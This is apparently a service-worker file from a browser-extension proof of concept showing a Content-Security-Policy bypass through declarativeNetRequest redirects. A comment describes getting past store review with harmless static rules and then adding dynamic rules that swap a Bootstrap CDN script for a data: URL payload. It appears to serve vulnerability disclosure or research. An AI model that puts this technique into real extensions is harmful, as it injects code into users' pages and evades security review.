// Background service worker for DNR CSP Bypass PoC
//
// This PoC uses STATIC rules (rules.json) for simplicity.
// In a real attack, an extension could pass App Store review with benign
// static rules and then add malicious rules dynamically:
//
// chrome.declarativeNetRequest.updateDynamicRules({
//   addRules: [{
//     id: 100,
//     priority: 1,
//     action: {
//       type: "redirect",
//       redirect: {
//         regexSubstitution: "data:text/javascript;base64,<payload>"
//       }
//     },
//     condition: {
//       regexFilter: "https://cdn\\.jsdelivr\\.net/npm/bootstrap.*\\.js",
//       resourceTypes: ["script"]
//     }
//   }]
// });

console.log("[DNR CSP Bypass PoC] Extension loaded. Static redirect rules active.");
console.log("[DNR CSP Bypass PoC] Any page loading https://localhost:8443/allowed-script.js");
console.log("[DNR CSP Bypass PoC] will have the script redirected to a data: URL,");
console.log("[DNR CSP Bypass PoC] bypassing the page's Content-Security-Policy.");
